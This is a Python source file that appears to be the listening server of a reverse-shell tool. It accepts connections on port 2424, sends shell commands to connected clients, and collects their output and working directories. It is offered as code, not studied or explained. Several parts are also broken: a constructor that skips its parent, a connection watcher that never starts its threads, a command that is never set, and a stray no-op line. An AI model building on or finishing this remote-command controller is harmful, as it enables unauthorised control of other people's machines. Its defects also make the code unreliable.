import socket
import threading
import time
import multiprocessing
import os


connection_list = []

class SocketHandler(multiprocessing.Process):
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port

    def handle(self):
        global connection_list
        # create a socket object
        sock = socket.socket()
        # bind the socket to all IP addresses of this host
        sock.bind((self.server_host, self.server_port))
        sock.listen(5)
        while True:
            # accept any connections attempted
            client_sock, client_ip = sock.accept()
            current_client = ClientHandler(client_sock, client_ip)
            connection_list.append([current_client,None])
            a=1+1

class ClientHandler(multiprocessing.Process):

    def __init__(self, socket, ip, command=None):
        super(ClientHandler, self).__init__()
        self.ENCODING = 'utf-8'
        self.BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
        self.SEPARATOR = "<sep>"  # separator string for sending 2 messages in one go
        self.command = command or ''
        self.current_dir = ''
        self.last_response = ''
        self.socket = socket
        self.ip = ip

    def handle(self):
        global connection_list
        ### print(f"{self.ip}: Connected!")

        # receiving the current working directory of the client
        self.current_dir = self.socket.recv(self.BUFFER_SIZE).decode(encoding=self.ENCODING)
        ###print("[+] Current working directory:", current_dir)

        while True:
            # get the command from prompt
            # command = input(f'{current_dir} $> ')
            if not self.command.strip():
                time.sleep(1)
                continue  # noting to do

            # send the command to the client...
            self.socket.send((self.command.encode()))
            if self.command.lower() == 'exit':
                break  # ...then if the command is exit, just break out of the loop

            # retrieve command results then split command output and current directory
            self.last_response, self.current_dir = self.socket.recv(self.BUFFER_SIZE) \
                .decode(encoding=self.ENCODING).split(self.SEPARATOR)

            if __debug__:
                print('results', self.last_response)

            # results = results.replace("\\\\", "\\")
            # print(results)  # print output

    # sock.close()  # close server connection

def look():
    __con_lst = []
    while True:
        print(__con_lst)
        if not __con_lst == connection_list:
            for e in connection_list:
                if not __con_lst.__contains__(e[0]):
                    e[1] = threading.Thread(target=e[0].handle)
                    print(f'New connection added {e[0].ip}')


def main():
    global connection_list
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 2424

    sock_handler = SocketHandler(server_host=SERVER_HOST, server_port=SERVER_PORT)
    threading.Thread(target=look).start()
    threading.Thread(target=sock_handler.handle).start()
    input()







if __name__ == '__main__':
    multiprocessing.set_start_method('spawn', force=True)
    main()
